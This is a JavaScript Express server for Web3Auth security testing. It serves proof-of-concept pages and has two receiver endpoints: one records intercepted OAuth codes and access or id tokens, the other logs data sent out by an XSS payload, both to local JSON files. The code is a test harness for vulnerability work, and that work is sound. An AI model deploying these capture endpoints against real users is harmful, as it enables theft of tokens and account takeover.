/**
 * Test server for serving PoC HTML files during security testing
 */
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'poc-files')));

// Log all requests
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Malicious OAuth redirect endpoint (for testing)
app.get('/capture-oauth', (req, res) => {
  console.log('🔴 SECURITY TEST: OAuth redirect captured');
  console.log('Query Params:', req.query);
  console.log('Headers:', req.headers);

  const capturedData = {
    timestamp: new Date().toISOString(),
    code: req.query.code,
    state: req.query.state,
    id_token: req.query.id_token,
    access_token: req.query.access_token,
    userAgent: req.headers['user-agent'],
    referer: req.headers['referer']
  };

  // Log to file for evidence
  const logFile = path.join(__dirname, 'test-results', 'captured-oauth-tokens.json');
  fs.appendFileSync(logFile, JSON.stringify(capturedData, null, 2) + '\n');

  res.send(`
    <html>
      <head><title>OAuth Capture Test</title></head>
      <body>
        <h1 id="capture-status">✅ OAuth Redirect Captured (Security Test)</h1>
        <pre id="captured-data">${JSON.stringify(capturedData, null, 2)}</pre>
        <p style="color: red;">This is a security vulnerability test - tokens were intercepted</p>
      </body>
    </html>
  `);
});

// XSS exfiltration endpoint (for testing)
app.post('/exfiltrate', (req, res) => {
  console.log('🔴 SECURITY TEST: XSS exfiltration attempt');
  console.log('Exfiltrated Data:', req.body);

  const logFile = path.join(__dirname, 'test-results', 'exfiltrated-data.json');
  fs.appendFileSync(logFile, JSON.stringify({
    timestamp: new Date().toISOString(),
    data: req.body
  }, null, 2) + '\n');

  res.json({ status: 'captured' });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🔒 Web3Auth Security Testing Server`);
  console.log(`   Running on http://localhost:${PORT}`);
  console.log(`   Serving PoC files from: ${path.join(__dirname, 'poc-files')}`);
  console.log(`   Ready for Playwright tests\n`);
});

// Ensure test-results directory exists
const testResultsDir = path.join(__dirname, 'test-results');
if (!fs.existsSync(testResultsDir)) {
  fs.mkdirSync(testResultsDir, { recursive: true });
}
